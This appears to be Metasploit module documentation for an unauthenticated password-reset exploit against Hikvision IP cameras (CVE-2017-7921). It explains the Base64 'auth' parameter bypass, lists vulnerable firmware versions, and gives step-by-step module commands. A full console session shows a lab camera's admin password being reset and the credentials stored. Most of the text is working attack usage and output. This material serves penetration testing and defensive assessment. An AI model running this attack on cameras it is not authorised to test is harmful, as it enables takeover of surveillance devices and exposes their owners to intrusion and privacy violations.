## Vulnerable Application

Many Hikvision IP cameras contain improper authentication logic that allow unauthenticated impersonation of any
configured user account. This allows an attacker to bypass all security on the camera and
gain full admin access, allowing them to thereby completely control the camera and modify
any setting or retrieve sensitive information.

This module allows the attacker to perform an unauthenticated password change on
any vulnerable Hikvision IP Camera by utilizing the improper authentication logic to
send a request  to the server which contains an `auth` parameter in the query string
containing a Base64 encoded version of the authorization in `username:password` format.
Vulnerable cameras will ignore the `username` parameter and will instead use the username
part of this string as the user to log in as. This can then be used to gain full 
administrative access to the affected device.

The vulnerability has been present in Hikvision products since 2014.
In addition to Hikvision-branded devices, it affects many white-labeled
camera products sold under a variety of brand names.

Below is a list of vulnerable firmware, but many other white-labelled versions might be vulnerable.

* DS-2CD2xx2F-I Series: V5.2.0 build 140721 to V5.4.0 build 160530
* DS-2CD2xx0F-I Series: V5.2.0 build 140721 to V5.4.0 Build 160401
* DS-2CD2xx2FWD Series: V5.3.1 build 150410 to V5.4.4 Build 161125
* DS-2CD4x2xFWD Series: V5.2.0 build 140721 to V5.4.0 Build 160414
* DS-2CD4xx5 Series: V5.2.0 build 140721 to V5.4.0 Build 160421
* DS-2DFx Series: V5.2.0 build 140805 to V5.4.5 Build 160928
* DS-2CD63xx Series: V5.0.9 build 140305 to V5.3.5 Build 160106

Installing a vulnerable test bed requires a Hikvision camera with the vulnerable firmware loaded.

This module has been tested against a Hikvision camera with the specifications listed below:

* MANUFACTURER: Hikvision.China
* MODEL: DS-2CD2142FWD-IS
* FIRMWARE VERSION: V5.4.1
* FIRMWARE RELEASE: build 160525
* BOOT VERSION: V1.3.4
* BOOT RELEASE: 100316

## Verification Steps

1. `use auxiliary/admin/http/hikvision_unauth_pwd_reset_cve_2017_7921`
1. `set RHOSTS <TARGET HOSTS>`
1. `set RPORT <port>`
1. `set USERNAME <name of user>`
1. `set PASSWORD <new password>`
1. `check`
1. `set ID <id of user whose password you want to reset from "check" output>`
1. `run`
1. You should get a message that the password for the user has been successfully changed.

## Options
### STORE_CRED
This option allows you to store the user and password credentials in the Metasploit database for further use.

## Scenarios

### Hikvision DS-2CD2142FWD-IS Firmware Version V5.4.1 build 160525

```
msf6 > use auxiliary/admin/http/hikvision_unauth_pwd_reset_cve_2017_7921
msf6 auxiliary(admin/http/hikvision_unauth_pwd_reset_cve_2017_7921) > set RHOSTS 192.168.100.180
RHOSTS => 192.168.100.180
msf6 auxiliary(admin/http/hikvision_unauth_pwd_reset_cve_2017_7921) > set USERNAME admin
USERNAME => admin
msf6 auxiliary(admin/http/hikvision_unauth_pwd_reset_cve_2017_7921) > set PASSWORD Pa$$W0rd
PASSWORD => Pa$$W0rd
msf6 auxiliary(admin/http/hikvision_unauth_pwd_reset_cve_2017_7921) > set ID 1
ID => 1
msf6 auxiliary(admin/http/hikvision_unauth_pwd_reset_cve_2017_7921) > set STORE_CRED true
STORE_CRED => true
msf6 auxiliary(admin/http/hikvision_unauth_pwd_reset_cve_2017_7921) > options

Module options (auxiliary/admin/http/hikvision_unauth_pwd_reset_cve_2017_7921):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   ID          1                yes       ID (default 1 for admin)
   PASSWORD    Pa$$W0rd         yes       New Password (at least 2 UPPERCASE, 2 lowercase and 2 special characters
   Proxies                      no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS      192.168.100.180  yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploi
                                          t
   RPORT       80               yes       The target port (TCP)
   SSL         false            no        Negotiate SSL/TLS for outgoing connections
   STORE_CRED  true             no        Store credential into the database.
   USERNAME    admin            yes       Username for password change
   VHOST                        no        HTTP server virtual host

msf6 auxiliary(admin/http/hikvision_unauth_pwd_reset_cve_2017_7921) > check

[*] Following users are available for password reset...
[*] USERNAME:admin | ID:1 | ROLE:Administrator
[*] USERNAME:admln | ID:2 | ROLE:Operator
[+] 192.168.100.180:80 - The target is vulnerable.
msf6 auxiliary(admin/http/hikvision_unauth_pwd_reset_cve_2017_7921) > run
[*] Running module against 192.168.100.180

[*] Following users are available for password reset...
[*] USERNAME:admin | ID:1 | ROLE:Administrator
[*] USERNAME:admln | ID:2 | ROLE:Operator
[*] Starting the password reset for admin...
[+] Password reset for admin was successfully completed!
[*] Please log in with your new password: Pa$$W0rd
[*] Credentials for admin were added to the database...
[*] Auxiliary module execution completed
msf6 auxiliary(admin/http/hikvision_unauth_pwd_reset) > creds -O 192.168.100.180
Credentials
===========

host             origin           service        public  private   realm  private_type  JtR Format
----             ------           -------        ------  -------   -----  ------------  ----------
192.168.100.180  192.168.100.180  80/tcp (http)  admin   Pa$$W0rd         Password

msf6 auxiliary(admin/http/hikvision_unauth_pwd_reset_cve_2017_7921) 
```
